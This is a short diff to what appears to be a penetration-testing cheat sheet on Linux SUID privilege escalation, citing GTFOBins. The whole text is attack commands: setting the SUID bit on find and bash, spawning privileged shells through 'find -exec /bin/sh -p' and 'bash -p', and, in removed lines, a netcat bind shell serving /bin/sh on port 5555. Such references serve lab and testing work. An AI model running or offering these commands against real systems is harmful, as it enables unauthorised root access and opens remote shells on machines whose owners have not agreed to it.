@@ -27,11 +27,8 @@ https://gtfobins.github.io/
     ls -al /usr/bin/find
 # find
     chmod +s /usr/bin/find
-    find pentestlab -exec whoami \;
-    find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;
-    find / -type f -name getflag -exec "whoami" \;
-    find / -type f -name getflag -exec "/bin/sh" \;
-    find . -exec '/bin/sh' \;
+    find . -exec 'whoami' \;
+    find . -exec /bin/sh -p \; -quit
 # bash
     chmod +s /bin/bash
     bash -p
